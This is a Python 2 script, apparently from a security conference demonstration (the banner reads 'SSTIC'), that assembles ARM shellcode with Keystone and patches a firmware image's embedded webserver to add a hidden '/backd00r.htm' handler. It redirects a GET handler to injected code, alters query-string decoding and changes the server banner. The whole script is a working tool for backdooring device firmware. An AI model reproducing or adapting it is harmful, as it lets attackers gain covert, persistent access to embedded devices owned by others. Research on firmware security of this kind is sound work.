#!/usr/bin/python

import sys
from keystone import *
from capstone import *
import datetime

now = datetime.datetime.now()

def asm_sc(sc):
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    try:
        v = ks.asm(sc)
    except KsError as e:
        print """========================================================
== ERRORERRORERRORERRORERRORERRORERRORERRORERRORERROR ==
========================================================"""
        print e.message
        print "Keystone error", e.get_asm_count()
        return ''
    return ''.join(chr(x) for x in v[0])

def disasm_sc(sc):
    cs = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    for i in cs.disasm(sc, 0):
	print("0x%x:\t%s\t%s" %(i.address, i.mnemonic, i.op_str))

with open("GET_handler.S", "rb") as f:
    handler_code = asm_sc(f.read())
    disasm_sc(handler_code)

webserver_offset = 0xf6716c
webserver_size = 0x2b89d8

PATCHES = []

# Patch handler name: /html/IRC.exe -> /backd00r.htm
PATCH1 = {"offset": 0x1410, "size": len("/backd00r.htm"), "prev_data": "/html/IRC.exe", "patch": "/backd00r.htm", "decode": None}
PATCHES.append(PATCH1)

# Patch GET handler address: 0x29278 -> 0x193CD4
PATCH2 = {"offset": 0x188B18, "size": 4, "prev_data": "78920200", "patch": "D43C1A00", "decode": "hex"}
PATCHES.append(PATCH2)

# Create new GET handler at 0x193CD4
PATCH3 = {"offset": 0x193CD4, "size": len(handler_code), "patch": handler_code, "decode": None}
PATCHES.append(PATCH3)

# Patch server string :)
PATCH4 = {"offset": 0xFBFE, "size": len("Server/1.30"), "prev_data": "Server/1.30", "patch": "SSTIC/%02d.%02d" % (now.hour, now.minute), "decode": None}
#PATCH4 = {"offset": 0xFBFE, "size": len("Server/1.30"), "prev_data": "Server/1.30", "patch": "SSTIC/13.37", "decode": None}
PATCHES.append(PATCH4)

# Patch query string decoding bug...
# "%d" => addrof("%02x")
PATCH5 = {"offset": 0x5D534, "size": 4, "prev_data": "25640000", "patch": "A8CE0400", "decode": "hex"}
PATCHES.append(PATCH5)
# ADR R1, "%d" => LDR R1, addrof("%02x")
PATCH6 = {"offset": 0x5D1A4, "size": 4, "prev_data": "E21F8FE2", "patch": "88139FE5", "decode": "hex"}
PATCHES.append(PATCH6)

# Patch verbosity
PATCH7 = {"offset": 0x3A6D4, "size": 1, "prev_data": "00", "patch": "09", "decode": "hex"}
PATCHES.append(PATCH7)

if len(sys.argv) < 2:
    print "usage: %s <elf.bin>" % sys.argv[0]
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    elf_data = f.read()

data = elf_data[webserver_offset:webserver_offset+webserver_size]

for patch in PATCHES:

    check_data = data[patch["offset"]:patch["offset"]+patch["size"]]
    if "prev_data" in patch:
        if patch["decode"] is None:
            prev_data = patch["prev_data"]
        else:
            prev_data = patch["prev_data"].decode("hex")
        if check_data != prev_data:
            print "[-] Error, bad file content at offset %x" % patch["offset"]
            sys.exit(1)

    if patch["decode"] is None:
        patch_data = patch["patch"]
    else:
        patch_data = patch["patch"].decode("hex")

    data = data[:patch["offset"]] + patch_data + data[patch["offset"]+patch["size"]:]

#Debug
with open(sys.argv[1] + ".webserver.text", "wb") as f:
    f.write(data)

elf_data = elf_data[:webserver_offset] + data + elf_data[webserver_offset+webserver_size:]
with open(sys.argv[1] + ".patched", "wb") as f:
    f.write(elf_data)

print "[+] Patch applied to %s.patched" % sys.argv[1]
